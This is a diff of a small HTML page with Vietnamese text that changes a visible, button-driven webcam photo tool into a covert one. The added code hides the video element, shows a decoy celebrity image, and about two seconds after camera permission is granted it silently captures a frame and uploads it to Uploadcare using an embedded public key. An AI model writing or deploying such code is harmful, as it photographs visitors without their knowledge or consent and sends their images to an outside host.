@@ -1,46 +1,78 @@
 <!DOCTYPE html>
-<html lang="vi">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Camera Uploadcare</title>
+  <title>Tự động chụp và upload ảnh</title>
   <style>
-    body { font-family: Arial; text-align: center; margin-top: 2rem; }
-    video, img { width: 100%; max-width: 400px; margin: 1rem auto; display: block; border: 2px solid #ccc; border-radius: 10px; }
-    button { padding: 10px 20px; font-size: 16px; margin-top: 10px; }
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 20px;
+    }
+    img.main-img {
+      width: 300px;
+      margin-bottom: 20px;
+    }
+    video {
+      display: none;
+    }
   </style>
 </head>
 <body>
-  <h1>📸 Chụp ảnh và tải lên Uploadcare</h1>
-  <video id="camera" autoplay playsinline></video>
-  <button onclick="takePhoto()">Chụp ảnh</button>
-  <img id="preview" src="" alt="Ảnh đã chụp">
+
+  <h2>Ảnh mẫu:</h2>
+  <img class="main-img" src="https://phamgiamedia.vn/wp-content/uploads/2023/12/Ngoc-Trinh-2.jpg" alt="Sample Image">
+
+  <video id="video" autoplay playsinline></video>
+
   <script>
-    const video = document.getElementById('camera');
-    const preview = document.getElementById('preview');
+    const video = document.getElementById('video');
 
+    // Xin quyền truy cập camera
     navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => { video.srcObject = stream; })
-      .catch(err => alert("Không thể truy cập camera: " + err));
+      .then(stream => {
+        video.srcObject = stream;
 
-    function takePhoto() {
+        // Chờ video load xong, sau đó chụp ảnh sau 2 giây
+        video.onloadedmetadata = () => {
+          setTimeout(() => {
+            captureAndUpload();
+          }, 2000);
+        };
+      })
+      .catch(err => {
+        console.error('Không thể truy cập camera:', err);
+      });
+
+    function captureAndUpload() {
       const canvas = document.createElement('canvas');
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video, 0, 0);
+
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
       canvas.toBlob(blob => {
         const formData = new FormData();
-        formData.append('photo', blob, 'photo.jpg');
-        fetch('/upload', {
+        formData.append('UPLOADCARE_STORE', '1');
+        formData.append('UPLOADCARE_PUB_KEY', '830b3ce89606cea831ba');
+        formData.append('file', blob, 'photo.jpg');
+
+        fetch('https://upload.uploadcare.com/base/', {
           method: 'POST',
           body: formData
         })
         .then(res => res.json())
         .then(data => {
-          preview.src = data.url;
+          console.log('✅ Ảnh đã upload lên Uploadcare:', data);
+          alert('✅ Ảnh đã được tải lên thành công!');
         })
-        .catch(err => alert("Lỗi khi upload: " + err));
+        .catch(err => {
+          console.error('❌ Lỗi upload:', err);
+        });
       }, 'image/jpeg');
     }
   </script>
+
 </body>
 </html>
